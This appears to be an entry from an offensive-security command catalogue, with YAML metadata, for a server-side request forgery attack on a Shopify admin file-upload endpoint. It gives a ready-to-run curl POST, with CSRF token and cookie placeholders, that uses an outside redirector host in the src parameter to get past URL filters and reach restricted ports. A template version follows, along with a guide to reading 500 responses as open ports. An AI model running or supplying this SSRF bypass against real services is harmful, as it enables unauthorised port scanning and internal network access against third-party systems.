---
data: >-
  curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' -H
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H
  'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' -H 'Cookie:
  COOKIES' -d 'src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21'
tags:
  - ssrf
  - bypass
type: command
output: HTTP/1.1 500 Internal Server Error
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.411Z'
id: 02f467d0-3212-4675-b1a1-0e4804c41d68
verified: false
validated: true
submitted: true
---
# bypass-url-filters-with-redirection

## Command

```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21'
```

## Description

Bypasses Shopify URL filters by using a redirector in the src parameter to target restricted ports.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `src` | Encoded redirect URL | Yes |
| r | Redirect target in query | Yes |

## Examples

### Basic Usage

```bash
curl ... -d 'src=http%3A%2F%2Fredirector/r.php?r=http://target:21'
```

## Expected Output

HTTP/1.1 500 if port open, indicating successful bypass and connection.

## Related

- [[commands/perform-port-scan-on-external-host]]
